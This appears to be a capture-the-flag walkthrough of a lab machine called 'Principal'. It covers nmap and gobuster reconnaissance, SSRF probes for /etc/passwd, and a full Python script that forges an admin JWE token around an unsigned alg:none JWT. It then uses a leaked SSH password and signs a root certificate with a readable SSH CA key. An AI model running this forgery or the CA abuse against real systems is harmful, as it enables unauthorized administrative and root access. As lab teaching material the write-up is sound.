Principal Writeup

Author: atrox | Tags: JWT Forgery, JWE, Admin Panel, Credential Leak, SSH CA Key Abuse

Attack Vector: JWT Forgery → Admin Panel Credential Leak → SSH CA Key Abuse

Overview

This writeup documents the full compromise of the Principal Internal Platform, a Jetty-based web application using JWT/JWE authentication. The attack chains together four distinct weaknesses to move from an unauthenticated visitor to a root shell.

Vulnerabilities Chained:

  • Information disclosure via frontend JavaScript
  • Improper JWT trust design (accepting alg: none inner token)
  • Credential exposure in admin settings panel
  • World-readable SSH Certificate Authority private key

1. Initial Reconnaissance

Start with a full aggressive Nmap scan to map the attack surface.

sudo nmap -A $target

Key findings:

PortServiceDetails
22/tcpSSHOpenSSH 9.6p1 Ubuntu
8080/tcpHTTPJetty — Principal Internal Platform

The HTTP response header leaked the auth framework: X-Powered-By: pac4j-jwt/6.0.3. pac4j-jwt signals that JWT is central to the application's trust model — a strong hint about where to attack.

2. Directory Enumeration

gobuster dir -u http://$target:8080/ -w /usr/share/wordlists/dirb/common.txt -t 40 -x php,html,txt,zip
PathStatusObservation
/dashboard200Returns content without authentication
/api/experiments401Protected API endpoint
/login200Login page
/render/...400Potential URL rendering proxy

Key insight: /dashboard returning HTTP 200 without a session is suspicious. The authentication check is likely happening client-side in JavaScript.

3. Testing the /render Endpoint

The /render path looked like a possible Server-Side Request Forgery (SSRF) vector. I tested various payloads:

curl http://$target:8080/render/http://127.0.0.1
curl http://$target:8080/render/file:///etc/passwd

All attempts returned HTTP 400 errors (Ambiguous URI). The endpoint is not exploitable in this form.

4. Accessing the Dashboard Without Auth

The dashboard returns full HTML to curl even without a session. The page briefly loads in a browser before redirecting to /login — the redirect is client-side JavaScript. The source references: <script src="/static/js/app.js"></script>.

5. JavaScript Source Analysis

curl -s http://$target:8080/static/js/app.js -o app.js
grep -Ei 'api|login|token|jwt|auth' app.js

Findings inside app.js included developer comments describing the entire authentication flow:

/**
 * Authentication flow:
 * 1. User submits credentials to /api/auth/login
 * 2. Server returns encrypted JWT (JWE) token
 * 3. Token is stored and sent as Bearer token for subsequent requests
 *
 * Token handling:
 * - Tokens are JWE-encrypted using RSA-OAEP-256 + A128GCM
 * - Public key available at /api/auth/jwks for token verification
 * - Inner JWT is signed with RS256
 */

Critical insight: The server publishes its RSA public key openly at /api/auth/jwks. If the server decrypts the outer JWE but does not verify the signature of the inner JWT (accepting alg: none), we can forge any claim.

6. Retrieving the JWKS Public Key

curl -s http://$target:8080/api/auth/jwks | jq

The JWKS endpoint reveals the RSA public key used for the JWE encryption. Protected endpoints confirm a token is required:

curl -i http://$target:8080/api/dashboard
# → {"error":"Unauthorized","message":"Bearer token required"}

7. Forging an Admin JWE Token

We craft an inner JWT with alg: none (unsigned) containing ROLE_ADMIN claims, then wrap it in a JWE using the server's public key.

#!/usr/bin/env python3
import json, time, base64, requests
from jwcrypto import jwk, jwe

BASE = "http://$target:8080"
def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

# Fetch the server's public key
jwks = requests.get(f"{BASE}/api/auth/jwks", timeout=10).json()
pub  = jwk.JWK.from_json(json.dumps(jwks["keys"][0]))

now = int(time.time())
claims = {
    "sub": "admin",
    "role": "ROLE_ADMIN",
    "iss": "principal-platform",
    "iat": now,
    "exp": now + 3600
}

# Build inner JWT with alg:none (no signature)
inner_header = {"alg": "none", "typ": "JWT"}
inner_token = (
    b64url(json.dumps(inner_header).encode()) + "." +
    b64url(json.dumps(claims).encode()) + "."
)

# Wrap in JWE using the server's public key
outer = jwe.JWE(
    plaintext=inner_token.encode(),
    protected={
        "alg": "RSA-OAEP-256", "enc": "A128GCM", "cty": "JWT", "kid": jwks["keys"][0].get("kid", "enc-key-1")
    }
)
outer.add_recipient(pub)
print(outer.serialize(compact=True))

8. Confirming Admin Access

curl -s -i http://$target:8080/api/dashboard -H "Authorization: Bearer $TOKEN"

Response contains: {"user": {"role": "ROLE_ADMIN", "username": "admin"}}. The activity log also leaked valid usernames: admin, administrator, amorales, jthompson, kkumar, svc-deploy.

9. Browser Session Injection

To use the admin UI visually, inject the token into the browser console:

sessionStorage.setItem("auth_token", "PASTE_TOKEN_HERE")
location.href = "/dashboard"

The dashboard reloads with Users and Settings tabs accessible.

10. Extracting Secrets from the Admin Panel

The Settings panel reveals critical infrastructure details:

SecurityencryptionKeyD3pl0y_$$H_Now42!
InfrastructuresshCaPath/opt/principal/ssh/

The encryptionKey combined with the svc-deploy username provides SSH credentials.

11. SSH Foothold

ssh svc-deploy@$target
# Password: D3pl0y_$$H_Now42!

Logged in successfully as svc-deploy. Check for quick escalation: sudo -l reveals no permissions.

12. Privilege Escalation via SSH CA Key

Enumerating /opt/principal/ssh/:

ls -la /opt/principal/ssh/
-rw-r----- root deployers  ca  <-- Private Key!

svc-deploy is in the deployers group. The README notes: "CA keypair for SSH certificate automation. Trusted by sshd for certificate-based authentication."

We generate a fresh SSH key pair and sign it for the root user using the readable CA key:

# Generate key
ssh-keygen -f mykey -N ""

# Sign key for principal 'root'
ssh-keygen -s ca_key -I root-cert -n root mykey.pub

Output: Signed user key mykey-cert.pub: id "root-cert" serial 0 for root valid forever

13. Root Access

Because sshd trusts certificates signed by this CA, the signed certificate allows direct root login:

ssh -i mykey root@localhost
id
uid=0(root) gid=0(root)

Root flag captured in /root/root.txt. 🎉

Initial Foothold

Trick the server into accepting admin access by crafting a JWE with an unsigned inner JWT (alg: none) after retrieving the JWKS public key.

Privilege Escalation

Abuse the SSH Certificate Authority private key readable by the svc-deploy user to sign a new identity for the root principal.
